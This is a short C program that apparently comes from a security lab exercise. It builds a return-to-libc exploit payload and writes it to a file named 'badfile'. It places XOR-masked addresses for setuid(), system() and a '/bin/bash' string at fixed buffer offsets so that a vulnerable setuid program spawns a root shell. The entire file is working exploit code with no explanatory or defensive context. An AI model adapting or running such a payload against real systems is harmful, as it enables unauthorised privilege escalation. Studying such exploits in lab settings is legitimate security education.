#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
	char buf[52];
	FILE *badfile;
	memset(buf, 1, sizeof(buf));
	badfile = fopen("./badfile", "w");
	unsigned int a = 0xbebebebe;
	*(long *) &buf[24] = 0xb7ecba90 ^ a; //setuid()
	*(long *) &buf[28] = 0xb7e55310 ^ a; //system()
	*(long *) &buf[32] = 0x00000000 ^ a; // parameter for uid
	*(long *) &buf[36] = 0xbffff423 ^ a; //"bin/bash"
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
}
